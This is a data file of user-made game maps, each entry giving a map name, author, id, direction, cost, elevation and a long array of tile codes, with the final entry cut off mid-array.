maps.push({name="Squidward Copium",author="EverReaper",id="#1673152132",direction="forward",cost=425,elevation=0,map=[0,0,0,0,0,5,2,2,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,65,65,65,65,5,0,0,0,0,0,0,0,0,0,0,0,0,5,65,65,65,65,65,65,65,5,0,0,0,0,5,5,0,0,0,0,5,65,65,65,65,65,65,65,65,5,0,0,0,5,65,65,5,0,0,0,5,65,65,65,65,65,65,5,5,5,5,0,5,65,65,65,5,0,0,5,65,65,5,65,65,65,5,0,0,0,44,5,65,65,5,65,5,0,0,5,65,5,65,65,65,5,0,0,0,0,0,44,5,65,5,5,5,5,0,5,65,5,65,5,65,5,44,0,5,5,44,44,5,5,65,65,65,65,5,5,65,5,65,5,65,65,5,44,44,44,44,5,65,65,65,65,65,65,5,5,65,5,65,5,65,65,65,5,5,5,5,65,65,65,65,65,65,65,5,5,65,5,65,5,65,65,65,5,5,5,5,65,65,65,65,65,65,65,5,5,65,5,65,5,65,65,5,0,0,0,44,5,65,65,65,65,65,65,5,5,65,5,65,5,65,5,0,0,5,5,0,44,5,5,65,65,65,65,5,5,65,5,65,65,65,5,44,0,0,0,44,44,5,65,5,5,5,5,0,5,65,65,5,65,65,65,5,44,44,44,44,5,65,65,5,65,5,0,0,0,5,65,65,65,65,65,65,5,5,5,5,0,5,65,65,65,5,0,0,0,5,65,65,65,65,65,65,65,65,5,0,0,0,5,65,65,5,0,0,0,0,5,65,65,65,65,65,65,65,5,0,0,0,0,5,5,5,0,0,0,0,0,5,5,65,65,65,65,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,2,2,5,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Copium",author="EverReaper",id="#1673154322",direction="left",cost=250,elevation=4,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,13,2,2,13,13,0,0,0,17,17,0,0,0,0,0,0,0,0,0,13,15,15,15,15,15,13,0,17,19,19,17,0,0,0,0,0,0,0,13,15,15,15,15,15,15,15,13,17,19,19,19,17,0,0,0,0,0,0,13,15,5,5,5,5,5,15,13,2,19,19,19,17,17,17,17,0,0,0,13,15,5,15,15,15,5,3,13,2,19,19,19,17,17,17,16,16,0,0,13,15,5,15,15,15,5,15,13,17,19,19,19,17,0,0,16,16,0,0,13,15,15,15,15,15,15,15,13,17,19,19,17,0,0,16,16,0,0,0,13,15,5,5,5,5,5,15,13,0,17,17,0,0,0,16,0,0,0,0,13,15,5,15,15,15,5,3,13,0,0,0,0,0,0,16,16,0,0,0,13,15,5,5,5,5,5,15,13,0,0,0,0,0,0,16,16,15,0,0,13,15,15,15,15,15,15,15,13,0,0,0,0,0,0,0,15,15,0,0,13,15,5,5,5,5,5,3,13,0,0,0,0,0,0,15,15,15,0,0,13,15,5,15,5,15,15,15,13,0,0,0,0,0,0,14,15,0,0,0,13,15,5,5,5,15,15,15,13,0,0,0,0,0,0,14,0,0,0,96,15,15,15,15,15,15,15,15,13,0,0,0,0,0,0,14,14,14,13,96,15,15,5,5,5,5,5,3,13,0,0,0,0,0,0,14,14,14,13,96,15,15,5,15,5,15,5,15,13,0,0,0,0,0,0,0,0,0,0,96,13,15,15,15,15,15,15,15,13,0,0,0,0,0,0,0,0,0,0,0,0,13,15,15,15,15,15,97,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,13,13,13,13,0,0]});
maps.push({name="Kz Bhops",author="EverReaper",id="#1673158343",direction="forward",cost=157,elevation=0,map=[0,0,29,29,0,0,0,0,29,0,28,0,0,0,0,0,0,2,2,0,0,0,29,29,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,30,0,65,65,0,0,0,0,0,30,0,27,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,31,0,0,0,0,31,31,0,31,0,26,26,26,0,0,0,0,0,0,0,0,0,0,0,0,99,31,0,0,0,26,65,65,0,0,0,0,5,5,30,32,0,0,0,0,0,0,0,0,0,26,65,0,0,30,30,10,45,45,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,97,30,10,45,45,28,0,33,34,102,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,34,34,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,26,0,0,0,0,0,65,29,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,65,65,29,0,30,0,31,0,0,0,0,0,0,5,5,0,0,0,0,0,29,29,29,0,0,0,0,0,0,0,0,0,0,5,5,199,0,0,0,0,0,0,0,0,0,32,0,33,0,0,0,0,0,5,132,199,0,0,0,0,0,0,0,0,0,0,34,0,0,0,0,0,0,96,96,199,0,0,0,0,0,0,0,0,0,0,34,0,0,0,0,0,0,98,98,0,131,34,34,93,0,0,0,34,0,34,34,34,0,0,0,0,0,101,101,0,100,34,34,93,0,34,0,0,0,34,34,104,0,0,0,0,0,103,103,0,0,34,34,34,0,0,0,0,0,34,0,0,0,0,0,0,0,5,5,0,0,34,34,34,34,34,34,34,34,34,0,0,0,0,0,0,0,2,2,0]});
maps.push({name="Kz Towers",author="EverReaper",id="#1673162308",direction="forward",cost=295,elevation=0,map=[0,0,0,40,40,0,0,0,40,40,0,0,0,0,0,0,0,2,2,0,0,0,40,1,1,40,0,40,1,1,40,0,40,0,0,0,5,5,5,0,0,0,40,1,1,40,0,40,1,1,104,0,0,0,39,0,5,5,5,0,0,0,0,40,40,0,0,0,40,40,0,0,0,0,39,0,5,5,5,0,40,40,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,0,40,40,0,0,0,0,0,0,0,0,0,0,0,0,38,0,5,5,5,94,131,100,0,0,0,35,35,102,35,0,0,36,0,0,0,0,5,5,5,5,0,0,0,0,35,65,65,65,65,35,0,0,0,37,0,0,5,5,5,94,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,0,0,5,5,5,5,103,5,5,101,5,5,98,5,5,96,5,5,5,5,0,0,5,5,5,5,103,5,5,101,5,5,98,5,5,96,5,5,5,5,0,0,5,5,5,0,0,44,44,0,0,0,0,0,0,0,0,0,0,0,0,0,95,95,95,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,0,0,5,5,5,0,0,0,44,44,0,0,0,44,44,0,0,3,3,3,0,0,5,5,5,0,0,44,1,1,44,0,44,1,1,44,0,58,58,58,44,0,95,95,95,0,0,44,1,1,99,0,44,1,1,97,0,58,58,58,42,0,5,5,5,0,0,0,44,44,0,0,0,44,44,0,0,58,58,58,40,0,5,132,5,0,0,0,0,0,0,0,0,0,0,0,0,40,42,44,0,0,5,5,5,0,75,75,75,5,5,75,75,75,5,5,75,75,75,5,131,0,2,2,0,0,75,75,75,5,5,75,75,75,5,5,75,75,75,5,93]});
maps.push({name="HASHTAG FUCKZPLIT",author="chinny",id="#1673185241",direction="forward",cost=704,elevation=0,map=[135,2,2,135,135,135,135,135,135,70,70,39,135,135,135,135,39,39,39,39,39,39,39,39,39,39,39,39,39,70,70,39,135,135,135,39,135,135,135,39,39,135,135,135,39,135,135,135,135,70,70,39,39,39,39,135,135,135,135,39,39,135,135,135,39,135,135,135,135,70,70,135,135,135,135,135,135,135,135,135,39,135,135,135,39,135,135,135,135,70,70,39,39,39,39,39,39,39,39,39,135,135,135,135,135,135,135,135,135,70,70,39,135,135,135,39,135,135,135,135,39,39,39,39,39,39,39,39,39,70,70,39,39,39,39,39,135,135,135,135,135,135,135,135,135,135,135,135,39,70,70,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,39,70,70,39,39,39,39,39,39,39,39,39,39,39,39,39,39,39,39,39,39,70,70,135,135,135,135,135,135,135,135,39,135,135,135,135,135,135,135,135,135,70,70,135,135,135,135,135,135,135,135,39,39,39,39,39,39,39,39,39,39,70,70,135,135,135,135,135,135,135,135,135,39,135,135,135,135,135,135,135,39,70,70,39,135,135,135,135,135,135,135,39,39,135,135,135,135,135,135,135,39,70,70,39,39,39,39,39,39,39,39,39,39,135,135,135,135,135,135,135,39,70,70,39,135,135,135,135,135,135,135,39,135,135,135,135,135,135,135,135,135,70,70,135,135,135,135,135,135,135,135,135,39,39,39,39,39,39,39,39,39,70,70,39,135,135,135,135,135,135,135,135,135,135,135,135,39,135,135,135,135,70,70,39,39,39,39,39,39,39,39,39,135,135,135,39,135,39,135,135,135,70,70,39,135,135,135,135,135,135,135,135,39,39,39,135,135,135,39,39,39,70,70,135,135,135,135,135,135,2,2,135]});
maps.push({name="Trusting Teammates",author="ZpLit",id="#1673214468",direction="left",cost=288,elevation=-5,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,0,94,5,5,5,5,5,5,5,5,5,5,5,5,0,0,0,0,7,7,0,5,13,13,13,12,11,11,11,10,9,8,8,5,0,0,0,0,7,7,0,5,13,87,13,12,11,88,11,10,9,8,8,5,0,0,0,0,127,128,0,5,13,13,13,12,11,11,11,10,9,8,8,5,0,0,0,0,0,0,0,5,12,12,12,5,5,45,45,5,5,5,5,5,0,0,0,0,0,0,0,91,11,11,11,91,1,31,31,1,0,0,0,0,0,0,0,0,0,0,0,5,11,11,11,5,1,32,32,1,0,0,0,0,0,0,0,0,0,0,0,5,45,45,45,45,1,33,33,1,0,0,0,0,0,0,0,0,0,0,0,5,45,45,45,45,1,34,34,1,0,0,0,0,0,0,5,5,5,5,5,5,11,11,11,5,1,34,34,1,0,0,0,0,0,0,5,8,8,8,5,5,12,12,12,5,1,33,33,1,0,0,0,0,0,0,5,8,8,86,5,5,13,13,13,5,1,32,32,1,0,0,0,0,0,0,5,8,8,8,5,141,14,14,14,5,1,31,31,1,0,0,0,0,0,0,5,90,8,8,5,15,14,100,14,94,5,45,45,91,5,5,5,5,5,5,5,8,8,90,5,88,5,5,87,11,11,45,45,11,11,10,9,8,86,8,8,8,8,8,5,2,5,5,5,100,11,45,45,11,11,10,9,8,8,90,8,8,87,8,5,2,5,5,5,11,11,45,45,11,11,10,9,8,8,8,86,8,90,8,5,88,5,5,5,12,141,5,5,91,5,5,5,5,5,5,5,5,5,5,94]});
maps.push({name="Doorhug",author="neox35725",id="#1673224365",direction="forward",cost=501,elevation=3,map=[2,2,7,6,70,158,70,162,162,68,68,68,68,68,69,70,5,5,1,1,5,5,70,6,70,70,158,70,162,162,68,68,68,68,70,5,5,1,1,1,70,6,70,70,6,7,7,7,7,7,7,7,7,7,5,5,1,1,1,1,70,6,6,6,6,13,11,13,11,13,11,13,11,13,5,1,1,1,1,0,70,7,158,7,10,13,11,13,11,13,11,13,11,14,5,1,1,1,0,0,70,7,158,7,10,13,11,13,11,13,11,14,12,14,1,1,1,0,0,0,158,7,158,7,10,13,11,13,11,14,12,14,12,14,1,1,0,0,0,0,158,7,158,7,10,13,11,14,12,14,12,14,126,129,126,0,0,0,0,1,158,7,23,7,10,14,12,14,12,14,12,14,12,14,1,0,0,0,1,1,158,7,22,23,11,14,12,14,12,14,12,14,12,14,0,0,0,1,1,1,158,7,23,23,11,14,12,14,12,14,12,14,12,14,0,0,1,1,1,5,7,7,23,22,11,14,12,14,12,14,12,14,12,14,0,1,1,1,5,5,7,69,69,7,11,14,12,14,12,14,12,14,12,14,1,1,1,5,5,5,8,69,69,7,11,14,12,14,12,14,12,175,175,14,1,1,5,5,5,5,8,69,69,7,11,14,12,14,12,175,175,170,170,175,1,5,5,5,6,6,8,69,69,7,11,14,12,14,175,170,170,44,41,44,190,5,5,6,6,6,8,69,69,7,11,14,12,14,175,44,41,44,14,14,190,5,6,6,6,6,8,69,69,7,11,14,12,175,170,44,41,44,14,14,190,5,69,69,69,6,8,8,69,7,11,14,12,175,41,44,41,44,177,199,68,68,69,69,69,69,2,2,1,1,9,9,9,190,190,190,190,190,69,68,68,68,68,68,68,68]});
maps.push({name="Beyond The Waterfall",author="ZpLit",id="#1673226940",direction="left",cost=412,elevation=-5,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,2,2,11,0,0,0,0,0,0,0,0,0,7,7,7,7,7,3,11,11,11,11,11,0,0,0,0,0,0,0,7,7,66,66,66,66,66,66,11,11,11,11,11,0,0,0,0,0,0,7,66,66,66,66,66,66,66,11,11,11,11,11,11,0,0,0,0,0,7,66,66,66,66,66,66,66,66,11,11,11,11,11,3,0,0,0,0,7,66,66,66,66,66,66,66,66,11,11,11,11,11,11,7,0,0,0,0,7,66,66,66,66,66,66,66,31,45,45,93,11,11,66,7,0,0,0,7,66,66,66,66,66,66,66,11,11,11,11,45,11,11,66,7,1,1,1,7,66,66,66,66,66,66,11,11,11,11,11,45,11,66,66,7,6,6,6,22,66,66,66,66,11,11,11,11,11,11,11,31,66,66,66,7,6,6,6,24,9998,11,11,11,11,11,11,11,11,11,11,66,66,66,7,0,6,6,6,20,9998,51,11,11,11,11,11,11,11,11,66,66,66,66,7,0,6,6,6,24,67,9998,51,11,11,11,11,11,11,66,66,66,66,66,7,0,6,6,6,24,67,0,9998,51,11,11,11,66,66,66,66,66,66,7,0,0,88,6,6,188,0,67,67,9998,9998,66,66,66,66,66,66,66,66,7,0,0,2,6,6,87,187,24,24,20,66,66,66,66,66,66,66,66,7,0,0,0,2,6,6,6,6,6,6,24,22,24,66,66,66,66,66,7,0,0,0,0,88,6,6,6,6,6,6,6,6,1,7,7,7,7,7,0,0,0,0,0,6,6,6,6,6,6,6,6,6,1,0,0,0,0,0,0,0,0,0,0,6,6,6,6,6,6,6,6,6,1,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="NoName2023",author="fantasy",id="#1673228187",direction="forward",cost=28,elevation=-10,map=[0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,44,44,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,44,44,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,44,44,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,41,41,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,41,41,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,41,41,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,37,37,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,37,37,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,37,37,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,34,34,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,34,34,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,34,34,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="shoot the zombos",author="fantasy",id="#1673229594",direction="forward",cost=137,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,25,0,105,105,0,105,105,0,105,105,0,25,0,0,105,105,0,0,0,0,0,0,105,105,0,105,105,0,105,105,0,0,25,0,105,105,0,25,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,25,0,105,105,0,0,0,0,105,105,0,0,0,0,105,105,0,25,0,0,0,0,105,105,0,0,25,0,105,105,0,0,0,0,105,105,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,25,0,105,105,0,105,105,25,0,0,0,105,105,0,105,105,0,105,105,0,0,0,105,105,0,105,105,0,0,0,25,105,105,0,105,105,0,105,105,0,25,0,0,0,0,0,0,0,0,0,0,0,0,0,25,0,0,0,0,0,0,0,105,105,0,25,0,0,0,25,0,0,0,0,0,0,0,0,25,0,25,0,105,105,0,0,0,0,0,0,0,25,0,0,0,25,0,25,0,0,0,0,0,0,0,0,25,0,0,0,0,0,0,0,0,0,0,0,0,0,25,0,105,105,0,105,105,0,105,105,0,105,105,0,105,105,0,105,105,0,105,105,105,105,0,105,105,0,105,105,0,105,105,0,105,105,0,105,105,0,105,105,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,25,0,0,25,0,0,25,0,0,25,0,0,0,0,25,0,0,105,105,0,0,0,0,0,0,0,0,0,0,0,0,0,25,0,0,0,0,105,105,105,105,105,105,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,105,2,2,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,94]});
maps.push({name="i love squidward",author="fantasy",id="#1673229627",direction="forward",cost=208,elevation=19,map=[24,24,24,24,24,2,2,24,24,24,24,24,24,24,24,24,24,24,24,24,24,7,94,7,24,5,5,24,0,0,0,0,0,0,0,0,0,0,0,24,24,7,7,7,24,6,6,24,0,0,0,0,0,0,0,0,0,0,0,24,24,7,7,7,7,7,7,7,7,7,7,7,7,7,7,7,7,7,7,24,24,0,7,0,24,8,8,24,0,0,0,0,0,0,0,0,0,0,7,24,24,0,7,0,24,9,9,24,0,0,0,0,0,0,0,0,0,0,7,24,24,0,7,0,24,10,10,24,0,0,0,0,0,0,0,0,0,0,7,24,24,0,7,0,24,11,11,24,0,0,0,0,7,7,7,7,7,7,7,24,24,0,7,0,24,12,12,24,0,0,0,0,7,24,24,24,24,24,24,24,24,0,7,0,24,13,13,24,0,0,0,0,7,24,0,0,0,0,0,0,24,0,7,0,24,14,14,24,0,0,0,0,7,24,0,0,0,0,0,0,24,0,7,0,24,15,15,24,0,0,0,0,7,24,0,0,0,0,0,0,24,0,7,0,24,16,16,24,0,0,0,0,7,24,0,0,0,0,0,0,24,0,7,0,24,17,17,24,0,0,0,0,7,24,0,0,0,0,0,0,24,0,7,0,24,18,18,24,0,0,0,0,7,24,0,0,0,0,0,0,24,7,7,0,24,19,19,24,0,0,0,0,3,24,0,0,0,0,0,0,24,141,7,0,24,20,20,24,0,0,0,0,7,24,0,0,0,0,0,0,24,7,7,0,24,21,21,24,0,0,0,0,7,24,0,0,0,0,0,0,24,0,7,0,24,22,22,24,0,0,0,0,24,24,24,24,0,0,0,0,100,0,93,0,24,23,23,24,0,0,0,0,24,2,2,24,0,0,0,0]});
maps.push({name="Tower Ascension",author="ZpLit",id="#1673233246",direction="forward",cost=535,elevation=19,map=[5,5,5,5,5,5,5,5,5,2,2,5,5,5,5,5,5,5,5,5,66,66,66,66,66,66,66,66,5,5,5,5,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,6,6,6,6,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,6,6,6,6,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,70,5,5,5,5,70,66,66,66,66,66,66,66,66,5,48,48,48,47,46,45,185,185,185,185,45,46,47,48,48,48,5,66,66,5,48,48,48,47,46,45,185,185,185,185,45,46,47,48,48,48,5,66,66,5,48,48,1,1,1,1,51,51,51,51,1,1,1,1,48,48,5,66,66,5,48,48,1,17,91,117,51,51,51,51,117,91,17,1,48,48,5,66,66,9998,85,85,1,17,17,1,51,51,51,51,1,17,17,1,85,85,9998,66,66,9998,85,85,1,17,17,1,51,51,51,51,1,17,17,1,85,85,9998,66,66,5,48,48,1,17,17,1,51,51,51,51,1,17,17,1,48,48,5,66,66,9998,85,85,1,24,4,1,51,51,51,51,1,23,141,1,85,85,9998,66,66,9998,85,85,1,0,1,1,51,51,51,51,1,1,17,1,85,85,9998,66,66,5,48,48,1,24,131,1,51,51,51,51,1,133,24,1,48,48,5,66,66,5,48,48,1,1,1,1,95,95,95,95,1,1,1,1,48,48,5,66,66,5,48,48,48,49,50,51,51,51,51,51,51,50,49,48,48,48,5,66,66,5,48,48,48,49,50,51,51,51,51,51,51,50,49,48,48,48,5,66,66,5,5,5,5,5,5,5,132,24,24,134,5,5,5,5,5,5,5,66,66,66,66,66,66,66,66,66,24,2,2,24,66,66,66,66,66,66,66,66]});
maps.push({name="abandoned building",author="alli",id="#1673236340",direction="right",cost=271,elevation=-11,map=[0,1,2,2,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,199,94,124,124,94,199,0,0,0,0,0,0,0,0,0,0,0,0,0,0,199,124,124,124,124,199,0,0,0,0,0,0,0,0,0,0,0,0,0,0,199,124,124,9998,85,199,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,90,9998,123,9998,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,199,124,9998,124,90,199,0,0,0,0,0,0,0,0,0,0,0,0,0,0,199,124,124,9998,124,199,0,0,0,0,0,0,0,0,0,0,0,0,0,0,199,90,9998,123,9998,199,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,124,9998,124,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,199,85,124,124,199,0,0,0,90,5,5,5,5,5,13,0,0,0,0,0,199,124,124,124,199,0,0,90,5,65,65,5,5,5,13,0,0,0,0,0,1,124,64,64,1,0,90,5,65,65,65,5,9998,6,13,13,0,0,0,0,1,58,58,58,24,0,5,65,65,65,65,5,5,7,13,13,13,0,0,0,1,93,58,9998,173,169,5,65,65,65,65,5,5,8,13,13,13,13,0,0,1,93,58,58,9998,0,5,65,65,65,65,5,5,9,13,13,13,2,0,0,1,93,58,9998,175,169,5,65,65,65,65,5,5,10,13,13,13,2,0,0,1,93,58,93,24,0,5,65,65,65,65,5,5,11,13,13,13,13,0,0,0,1,1,1,1,0,90,5,65,65,65,5,5,12,9998,13,13,0,0,0,0,0,0,0,0,0,0,90,5,65,65,5,5,13,13,13,141,0,0,0,0,0,0,0,0,0,0,0,90,5,5,5,5,5,5,5,5,0]});
maps.push({name="falling rocks",author="alli",id="#1673236398",direction="right",cost=165,elevation=0,map=[0,0,24,2,2,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,23,21,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,172,23,20,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,168,24,21,14,9998,9998,14,186,0,0,0,0,0,0,0,0,0,0,0,0,173,23,21,54,13,13,0,174,13,186,0,0,0,0,0,0,0,0,0,0,175,24,20,14,9998,9998,14,186,0,0,0,0,0,0,0,0,0,0,0,0,12,23,20,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,188,24,21,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,20,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,20,14,14,14,0,189,0,0,0,0,0,0,0,0,0,0,0,0,0,23,20,14,14,9998,0,13,0,0,0,0,0,0,189,0,0,0,0,0,0,23,21,14,9998,13,13,182,0,0,0,0,0,0,13,0,0,0,0,0,0,23,21,14,9998,9998,13,13,0,0,0,0,0,189,178,189,0,0,0,0,0,0,24,21,9998,9998,9998,13,9998,14,14,0,0,14,0,14,0,0,0,0,0,0,0,24,54,9998,9998,9998,14,14,14,14,14,9998,13,9998,14,14,14,0,0,0,169,181,24,21,14,14,14,14,14,14,14,9998,13,9998,14,14,2,0,0,0,190,12,186,23,21,21,21,20,14,14,14,14,54,14,14,14,2,0,0,0,0,0,0,0,23,23,24,23,21,20,20,21,21,20,21,20,24,0,0,0,0,0,0,0,0,0,0,0,24,24,23,24,23,23,24,23,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,168,177,179,12,186,0]});
maps.push({name="squidward moment",author="gxp",id="#1673236591",direction="right",cost=430,elevation=4,map=[1,1,1,1,1,1,1,1,1,2,2,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,92,92,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,40,40,40,40,40,40,40,40,1,1,1,1,1,1,1,1,1,1,40,40,40,40,40,40,40,40,92,40,40,40,1,1,1,1,1,1,1,1,40,5,5,5,5,40,92,40,40,40,40,40,40,1,1,1,1,1,1,40,40,5,1,1,5,40,40,40,40,40,40,40,40,40,1,1,1,1,40,40,40,5,1,1,5,40,40,40,92,40,40,40,40,40,1,1,1,1,40,40,40,92,44,44,5,40,40,40,40,40,40,40,40,40,40,1,1,40,40,40,40,5,5,5,5,40,40,40,40,1,1,40,40,40,40,1,1,40,40,40,40,5,5,40,92,40,40,40,40,0,0,0,40,40,40,1,1,40,40,40,40,5,5,40,40,40,40,40,40,0,0,0,40,40,40,1,1,40,40,40,40,5,5,5,5,40,40,40,40,1,1,40,40,40,40,1,1,1,40,40,40,5,44,104,5,40,40,40,40,40,40,40,40,40,40,1,1,1,40,40,40,5,1,1,5,40,40,40,92,40,40,40,40,40,1,1,1,1,1,40,40,5,1,1,5,40,92,40,40,40,40,40,40,40,1,1,1,1,1,1,40,5,5,5,5,40,40,40,40,40,40,40,40,1,1,1,1,1,1,1,40,40,40,40,40,40,40,40,92,40,40,40,1,1,1,1,1,1,1,1,1,41,40,40,40,40,40,40,40,40,1,1,1,1,1,2,24,89,23,22,21,103,1,1,1,40,40,1,1,1,1,1,1,139,44,2,138,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1]});
maps.push({name="Learn To Map Fantasy",author="ZpLit",id="#1673238021",direction="forward",cost=68,elevation=-18,map=[0,0,0,44,2,2,44,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,44,44,44,44,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,44,44,44,44,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,187,38,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,65,65,65,65,0,0,0,1,33,1,0,0,0,0,0,0,0,0,0,0,38,87,38,38,0,0,0,33,93,33,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,127,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,65,32,32,65,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,32,32,87,32,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,26,65,65,26,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,26,26,26,26,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,26,26,26,26,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,88,2,2,88,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Kz Climbing Madness",author="EverReaper",id="#1673238534",direction="left",cost=243,elevation=6,map=[25,25,0,26,0,0,0,99,44,43,41,0,41,0,0,0,2,2,0,0,137,25,0,0,0,199,0,0,44,0,0,0,0,0,40,0,5,5,0,0,0,0,0,0,27,199,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,199,0,0,44,0,44,0,0,97,40,0,5,5,0,0,0,0,0,28,0,0,0,0,0,0,0,0,0,40,40,0,5,5,0,0,0,29,0,0,0,0,0,0,0,0,0,0,0,40,40,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,44,44,0,95,95,0,5,5,0,0,30,0,0,0,0,0,0,0,0,0,131,44,0,95,95,0,5,5,0,0,0,0,31,1,136,1,1,1,1,0,0,0,39,40,40,0,5,5,0,0,0,0,0,1,44,50,37,132,1,0,38,39,39,39,39,0,5,5,0,0,0,0,32,1,42,0,0,45,1,0,38,38,39,0,0,0,5,5,0,0,100,34,34,1,49,0,0,38,1,0,0,0,0,0,0,0,5,5,0,0,133,34,34,1,41,0,0,46,1,0,195,195,0,0,0,0,5,5,0,0,0,0,0,1,48,0,0,39,1,0,18,18,0,0,0,0,5,5,0,0,0,0,0,1,0,40,47,0,1,0,0,0,0,0,9,9,5,5,0,0,0,0,0,1,1,1,1,1,1,0,0,37,0,0,10,8,5,5,0,0,0,0,0,0,0,0,0,0,0,0,33,35,0,0,11,7,5,5,5,88,2,11,11,11,11,98,98,11,11,11,11,11,11,11,11,6,101,5,5,5,2,11,11,134,11,98,98,11,11,11,11,11,11,11,11,5,101,5,5,102,11,11,11,11,11,98,98,11,11,11,11,11,11,11,11,0,101,0,0,0]});
maps.push({name="600",author="alli",id="#1673240635",direction="forward",cost=291,elevation=1,map=[0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,114,114,1,1,1,0,0,0,0,0,0,0,0,0,0,0,1,94,114,114,114,114,114,114,94,1,0,0,0,0,0,0,0,0,0,1,114,114,135,135,135,135,135,135,114,114,1,0,0,0,0,0,0,0,1,114,114,135,14,14,14,14,14,14,135,114,114,1,0,93,0,0,0,1,114,114,135,14,9998,9998,9998,9998,9998,9998,14,135,114,114,1,12,0,0,0,1,114,135,14,9998,13,13,13,13,13,13,9998,14,135,114,1,10,65,5,5,0,135,135,14,9998,13,19,54,54,19,13,9998,14,135,114,1,10,65,5,131,199,114,135,14,9998,13,54,114,114,54,13,9998,14,135,114,1,10,65,5,131,199,114,135